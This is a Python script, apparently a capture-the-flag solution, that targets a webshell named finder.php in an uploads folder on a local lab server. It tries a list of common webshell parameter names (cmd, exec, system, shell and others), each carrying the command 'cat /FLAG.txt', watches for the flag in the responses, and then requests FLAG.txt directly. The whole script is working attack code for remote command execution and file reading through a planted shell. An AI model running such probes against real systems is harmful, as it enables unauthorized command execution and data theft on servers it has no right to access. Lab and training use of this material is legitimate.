import requests

base_url = "http://127.0.0.1:32891"

print("[+] Testing common webshell parameter patterns on finder.php...")

# Common webshell parameter names and commands
test_cases = [
    # Command execution parameters
    ({'cmd': 'cat /FLAG.txt'}, 'cmd'),
    ({'c': 'cat /FLAG.txt'}, 'c'),
    ({'command': 'cat /FLAG.txt'}, 'command'),
    ({'exec': 'cat /FLAG.txt'}, 'exec'),
    ({'x': 'cat /FLAG.txt'}, 'x'),
    ({'system': 'cat /FLAG.txt'}, 'system'),
    ({'shell': 'cat /FLAG.txt'}, 'shell'),
    
    # File reading parameters
    ({'file': 'FLAG.txt'}, 'file (relative)'),
    ({'dir': '/FLAG.txt'}, 'dir'),
    ({'path': 'FLAG.txt'}, 'path (relative)'),
    
    # Try accessing via different methods
    ({'0': 'cat /FLAG.txt'}, 'numeric 0'),
    ({'1': 'cat /FLAG.txt'}, 'numeric 1'),
]

for params, description in test_cases:
    resp = requests.get(f"{base_url}/posts/uploads/finder.php", params=params)
    
    # Check if response changed from default directory listing
    if "FLAG{" in resp.text:
        print(f"\n[!!!] SUCCESS with {description}: {params}")
        print(f"FULL RESPONSE:\n{resp.text}")
        break
    elif resp.text[:50] != "total 84drwxr-xr-x   1 root root 4096 Jan  5 01:11":
        print(f"\n[+] Different response with {description}: {params}")
        print(f"Response (first 300 chars): {resp.text[:300]}")
    else:
        print(f"[-] Default response for {description}")

# Also try URL path-based access
print("\n[+] Testing if FLAG.txt is directly accessible...")
flag_resp = requests.get(f"{base_url}/FLAG.txt")
print(f"Status: {flag_resp.status_code}")
if flag_resp.status_code == 200:
    print(f"Content: {flag_resp.text}")

